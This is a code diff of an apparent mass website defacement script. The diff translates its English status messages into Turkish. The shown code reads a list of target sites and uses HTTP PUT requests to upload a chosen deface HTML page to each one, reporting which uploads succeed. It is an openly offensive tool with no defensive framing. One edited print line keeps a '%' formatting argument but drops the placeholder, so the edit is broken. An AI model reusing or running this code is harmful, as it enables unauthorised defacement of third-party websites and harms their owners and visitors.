@@ -44,7 +44,7 @@ def white(script,target_file="targets.txt"):
    with open(target_file, "r") as target:
       target = target.readlines()
       s = requests.Session()
-      print("uploading  your script to %d website"%(len(target)))
+      print("site scripti yükleniyor"%(len(target)))
       for web in target:
          try:
             site = web.strip()
@@ -52,9 +52,9 @@ def white(script,target_file="targets.txt"):
                site = "http://" + site
             req = s.put(site+"/"+script,data=op)
             if req.status_code < 200 or req.status_code >= 250:
-               print(m+"["+b+" FAILED TO UPLOAD !"+m+" ] %s/%s"%(site,script))
+               print(m+"["+b+" YÜKLEME BAŞARISIZ!"+m+" ] %s/%s"%(site,script))
             else:
-               print(m+"["+h+" SUCCESSFULLY UPLOADED"+m+" ] %s/%s"%(site,script))
+               print(m+"["+h+" YÜKLEME BAŞARILI"+m+" ] %s/%s"%(site,script))
 
          except requests.exceptions.RequestException:
             continue
@@ -65,9 +65,9 @@ def main(__bn__):
    print(__bn__)
    while True:
       try:
-         print('Please put the deface script in this same folder [white-deface] ')
+         print('AŞAĞI KISMA DEFACE EDİLECEK SCRİPTİ YAZIN ')
          print(' ')
-         a = eagle("[+]Enter your deface script's name or it's path [eg: defacescript.html] : ")
+         a = eagle("[+]DEFACE EDİLECEK SİTE SCRİPTİ SAL[örnek: defacescript.html] : ")
          if not os.path.isfile(a):
             print("file '%s' not found"%(a))
             continue
